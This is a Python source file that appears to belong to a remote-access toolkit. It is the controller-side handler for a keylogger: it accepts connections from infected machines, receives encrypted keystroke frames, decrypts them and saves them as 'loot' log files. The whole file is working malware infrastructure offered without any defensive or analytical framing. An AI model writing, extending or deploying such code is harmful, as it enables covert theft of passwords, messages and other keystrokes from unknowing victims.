import struct
import os
from datetime import datetime

from cryptography.fernet import Fernet
from core.crypto.encrypter import system
from core.utils.paths import ensure_project_dir
from colorama import Fore, init

init(autoreset=True)

LOG_DIR = ensure_project_dir("storage", "loot", "records", "keylogger")


def _create_log_path():
    os.makedirs(LOG_DIR, exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    return os.path.join(LOG_DIR, f"keylogger_{timestamp}.log")


def _get_fernet():
    key = system.getdata("KEY")
    if not key:
        return None
    if isinstance(key, str):
        key = key.encode()
    try:
        return Fernet(key)
    except Exception:
        return None


def _recv_exact(conn, size):
    data = b""
    while len(data) < size:
        chunk = conn.recv(size - len(data))
        if not chunk:
            return None
        data += chunk
    return data


def _recv_frame(conn):
    size_data = _recv_exact(conn, 4)
    if not size_data:
        return None
    size = size = struct.unpack('>I', size_data)[0]
    data = _recv_exact(conn, size)
    return data if data else None

def _recv_and_save(conn, stop_event, log_path):
    fernet = _get_fernet()
    try:
        while not (stop_event and stop_event.is_set()):
            data = _recv_frame(conn)
            if data is None:
                break
            if fernet:
                try:
                    text = fernet.decrypt(data).decode("utf-8", errors="replace")
                except Exception:
                    text = repr(data)
            else:
                text = data.decode("utf-8", errors="replace")
            with open(log_path, "a", encoding="utf-8") as log_file:
                log_file.write(text)
        print(f"{Fore.LIGHTGREEN_EX}[+] Keylogger controller disconnected")
    except Exception as error:
        print(f"{Fore.LIGHTRED_EX}[-] Keylogger controller error: {error}")
def handle_connection(conn, addr, stop_event=None):
    log_path = _create_log_path()
    print(f"{Fore.LIGHTGREEN_EX}[+] Keylogger controller connected from {Fore.LIGHTCYAN_EX}{addr}")
    print(f"{Fore.LIGHTGREEN_EX}[+] Logging key data to {Fore.LIGHTCYAN_EX}{log_path}")
    _recv_and_save(conn, stop_event, log_path)
